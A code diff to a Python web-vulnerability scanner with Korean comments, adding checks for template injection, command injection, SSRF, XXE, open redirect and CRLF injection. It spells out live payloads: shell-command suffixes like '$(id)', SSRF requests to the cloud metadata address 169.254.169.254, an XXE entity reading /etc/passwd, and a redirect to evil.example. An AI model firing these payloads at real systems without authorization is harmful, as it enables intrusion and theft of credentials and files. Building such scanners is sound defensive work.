@@ -32,7 +32,12 @@ def _ctx():
     return env.ssl_context()     # 기본 검증 on, SAST_INSECURE_TLS=1 시에만 비활성
 
 
-def _send(method, url, headers, body):
+class _NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *a, **k):
+        return None
+
+
+def _send(method, url, headers, body, redirect=True):
     if _req[0] >= MAX_REQ:
         if not _warned[0]:
             print(f"[!] 요청 상한 {MAX_REQ} 도달 — 이후 프로브 생략, 결과 부분적(SAST_REPLAY_REQ 로 상향)")
@@ -44,7 +49,12 @@ def _send(method, url, headers, body):
     req = urllib.request.Request(url, data=data, method=method,
                                  headers={k: v for k, v in headers.items() if k})
     try:
-        with urllib.request.urlopen(req, timeout=TIMEOUT, context=_ctx()) as r:
+        if redirect:
+            r = urllib.request.urlopen(req, timeout=TIMEOUT, context=_ctx())
+        else:   # 리다이렉트 비추적(오픈리다이렉트 탐지) — 3xx 는 HTTPError 로 잡혀 아래서 반환
+            opener = urllib.request.build_opener(_NoRedirect, urllib.request.HTTPSHandler(context=_ctx()))
+            r = opener.open(req, timeout=TIMEOUT)
+        with r:
             return r.status, {k.lower(): v for k, v in r.headers.items()}, r.read(300000).decode("utf-8", "replace")
     except urllib.error.HTTPError as e:
         return e.code, {k.lower(): v for k, v in (e.headers or {}).items()}, (e.read(80000).decode("utf-8", "replace") if hasattr(e, "read") else "")
@@ -64,6 +74,16 @@ def _headers_for(ex, cookie=None):
 _STATIC = re.compile(r"\.(?:css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|map|txt|xml)$", re.I)
 _PUBLIC = {"/", "/robots.txt", "/sitemap.xml", "/favicon.ico"}
 
+
+# 상용 DAST role 보강 — SSTI/명령인젝션/SSRF/오픈리다이렉트/CRLF/XXE
+_SSTI = [("{{7*7}}", "oz{{7*7}}oz"), ("${7*7}", "oz${7*7}oz"), ("#{7*7}", "oz#{7*7}oz"),
+         ("<%= 7*7 %>", "oz<%= 7*7 %>oz")]
+_CMD = [";id", "|id", "`id`", "$(id)", ";type C:\\Windows\\win.ini"]
+_URLISH = re.compile(r"(url|uri|link|src|dest|target|callback|webhook|image|img|feed|proxy|fetch|load|site|domain|host|redirect|open|next|out)", re.I)
+_REDIR = re.compile(r"(redirect|url|next|return|dest|target|goto|continue|back|out|link|to|u$)", re.I)
+_META = re.compile(r"ami-id|instance-id|iam/|meta-data|placement/|security-credentials")
+_SSRF_PAYLOADS = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80/", "http://localhost/"]
+_XXE = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY okx SYSTEM "file:///etc/passwd">]><r>&okx;</r>')
 
 _STORED_MARK = "okrStored9z"                 # 저장형 XSS 고유 마커
 _STORED_PAYLOAD = '"><' + _STORED_MARK + '>'  # 속성 탈출 + 태그(미이스케이프면 '<' 그대로 반사)
@@ -168,7 +188,8 @@ def scan_capture(exchanges, session=None, session_b=None):
     ck_a = session.cookie if session else None
     mode = f" · 세션 A={session.label}" + (f", B={session_b.label} (IDOR 교차확증)" if session_b else "") if session else ""
     print(f"[*] replay 검증: 캡처 {len(exchanges)}건 · 호스트 {', '.join(sorted(base_hosts))} (인가 대상 전제·비파괴){mode}")
-    print("[*] role: 무인증접근 · SQLi(오류/불리언) · XSS(반사/저장형) · 인증부재/우회 · IDOR(단일/2계정)")
+    print("[*] role: 무인증접근 · SQLi · XSS(반사/저장형) · LFI · SSTI · 명령인젝션 · SSRF · XXE · "
+          "오픈리다이렉트 · CRLF · 인증부재/우회 · IDOR(단일/2계정)")
     seen, reps = set(), []
     for ex in exchanges:
         sig = (ex["method"], ex["path"], tuple(sorted(k for k, _, _ in _params(ex))))
@@ -197,6 +218,15 @@ def scan_capture(exchanges, session=None, session_b=None):
         if not base:
             continue
         bl = _resp_len(base)
+
+        # ── XXE(본문 레벨): XML 요청이면 외부 엔티티로 /etc/passwd 읽기 시도(인밴드) ──
+        _ct = (ex["req_headers"].get("content-type") or "").lower()
+        _b0 = (ex["req_body"] or "").lstrip()
+        if "xml" in _ct or _b0.startswith("<?xml") or _b0[:1] == "<":
+            rxxe = _send(ex["method"], ex["url"], hdr, _XXE)
+            if rxxe and re.search(r"root:.*:0:0:", rxxe[2]):
+                add(_f("xxe", "high", ex, "(XML본문)", "external entity file:///etc/passwd",
+                       "XXE — 외부 엔티티로 /etc/passwd 반환", "true_positive"))
 
         # ── 2계정 권한검증(IDOR): A 요청을 B 세션으로 재전송 → B 응답에 'A 고유 토큰'이 있어야 확정 ──
         # 길이 유사만으로는 세션결정형(/api/mypage 처럼 id 무시하고 자기 데이터 반환) 오탐이 남는다.
@@ -252,6 +282,37 @@ def scan_capture(exchanges, session=None, session_b=None):
             if rp and re.search(r"root:.*:0:0:", rp[2]):
                 add(_f("path-traversal", "high", ex, key, "../../../../../../etc/passwd",
                        "/etc/passwd 내용 반환", "true_positive"))
+            # ── SSTI: 템플릿 산술 평가(oz49oz) ──
+            for _p, _pl in _SSTI:
+                us, bs = _mutate(ex, key, loc, _pl)
+                rs = _send(ex["method"], us, hdr, bs)
+                if rs and "oz49oz" in rs[2]:
+                    add(_f("ssti", "critical", ex, key, _pl, f"템플릿 산술 평가됨({_p}→49)", "true_positive")); break
+            # ── 명령 인젝션: 출력 기반(uid= / win.ini) ──
+            for _cp in _CMD:
+                uc, bc = _mutate(ex, key, loc, val + _cp)
+                rc = _send(ex["method"], uc, hdr, bc)
+                if rc and (re.search(r"uid=\d+\(", rc[2]) or "[extensions]" in rc[2].lower()):
+                    add(_f("command-injection", "critical", ex, key, val + _cp, "OS 명령 출력 반환", "true_positive")); break
+            # ── SSRF: URL성 파라미터 → 내부 메타데이터 반영(인밴드) ──
+            if _URLISH.search(key) or str(val).lower().startswith("http"):
+                for _sp in _SSRF_PAYLOADS:
+                    ur, br = _mutate(ex, key, loc, _sp)
+                    rr = _send(ex["method"], ur, hdr, br)
+                    if rr and _META.search(rr[2]):
+                        add(_f("ssrf", "high", ex, key, _sp, "내부 메타데이터/서비스 응답 반영", "true_positive")); break
+            # ── 오픈 리다이렉트: 외부로 3xx ──
+            if _REDIR.search(key) or str(val).startswith(("http", "/")):
+                ur, br = _mutate(ex, key, loc, "https://evil.example/")
+                rr = _send(ex["method"], ur, hdr, br, redirect=False)
+                if rr and 300 <= rr[0] < 400 and "evil.example" in (rr[1].get("location", "")):
+                    add(_f("open-redirect", "medium", ex, key, "https://evil.example/",
+                           f"외부 리다이렉트 Location={rr[1].get('location','')[:60]}", "true_positive"))
+            # ── CRLF/헤더 인젝션: 응답 헤더에 주입 ──
+            ucr, bcr = _mutate(ex, key, loc, val + "\r\nokrcrlf:1")
+            rcr = _send(ex["method"], ucr, hdr, bcr)
+            if rcr and any("okrcrlf" in str(k).lower() or "okrcrlf" in str(v).lower() for k, v in (rcr[1] or {}).items()):
+                add(_f("crlf-injection", "medium", ex, key, "\\r\\nokrcrlf:1", "응답 헤더 주입됨", "true_positive"))
             # ── 권한검증(IDOR): 객체참조 파라미터를 남의 id 로 ──
             if _IDOR_NAME.search(key) and re.fullmatch(r"\d{1,12}", str(val).strip()):
                 iv = int(val)
